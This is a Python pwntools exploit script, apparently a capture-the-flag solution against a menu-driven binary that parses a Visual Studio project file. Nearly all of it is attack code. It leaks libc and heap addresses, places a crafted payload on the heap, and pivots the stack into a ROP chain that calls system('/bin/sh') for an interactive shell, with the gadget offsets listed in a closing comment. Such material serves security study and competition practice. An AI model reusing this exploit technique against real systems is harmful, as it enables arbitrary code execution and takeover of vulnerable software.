#coding=utf8
from pwn import *
import time
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0
shell = 0

if local:
	sh = process('./demo')
	bin = ELF('./demo')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	# libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
elif shell:
	sh = process('./test.sh', shell=True)
else:
	sh = remote('0.0.0.0','0')
	bin = ELF('./demo')
	libc = ELF('./libc-2.23.so')
	#bin = ELF('')
	#libc = ELF('')


def zs(a=''):
	gdb.attach(target='xpwn', gdbscript=a, exe='./xpwn')
	if a == '':
		raw_input()
		
def z(a=''):
	gdb.attach(sh,a)
	if a == '':
		raw_input()

def edit(name=str, content=str):
    sh.recvuntil('Choice: ')
    sh.sendline('2')
    sh.recvuntil('edit')
    sh.sendline(name)
    sleep(1)
    sh.sendline(content)

def show(name=str):
    sh.recvuntil('Choice')
    sh.sendline('4')
    sh.recvuntil("MEME")
    sh.sendline(name)

def parse():
    sh.recvuntil("Choice")
    sh.sendline('1')
    sh.recvuntil("content")

parse()
with open('BFS.vcxproj') as fp:
	content = fp.read()
sh.send(content + '\xff')
show("Project")
sh.recvuntil("Useless")
libc_addr = u64(sh.recv(6).ljust(8, b'\x00')) - 0x3C4B78 - 0x80 - 0x250
success("libc_addr:" + hex(libc_addr))
edit("Project6", 'a' * 0x60)
edit("Project6", "a")
show("Project6")
sh.recvuntil('a' * 0x60)
heap_addr = u64(sh.recvuntil('\x0a')[:-1].ljust(8, b'\x00'))
success("heap_addr:" + hex(heap_addr))
payload = "/bin/sh\x00"
payload += p64(libc_addr + 0xb6316)
payload = payload.ljust(0xc0, 'a') + p64(heap_addr + 0x1578)
ropchain = p64(libc_addr + 0x102083)
ropchain += 'a' * (0xf - 8)
ropchain += p64(libc_addr + 0x3838)
ropchain = ropchain.ljust(0x20, 'a')
ropchain += p64(libc_addr + 0x21112)
ropchain += p64(libc_addr + next(libc.search("/bin/sh")))
ropchain += p64(libc_addr + libc.sym['system'])
edit("Project5", ropchain)
edit("Project5", 'a')
edit("Project4", payload)
edit("Project4", 'a')
show("Project5")
sh.interactive()


'''remote
call -> 0x00000000000b6316 : push rsi ; fcos ; jmp qword ptr [rsi + 0xf]
rsi + 0xf:
0x0000000000003838 : pop rsp ; ret
rsi:
0x0000000000102083 : sub al, 0 ; add rsp, 0x18 ; ret
rsi + 0x18:
0x0000000000021112 : pop rdi ; ret
/bin/sh
'''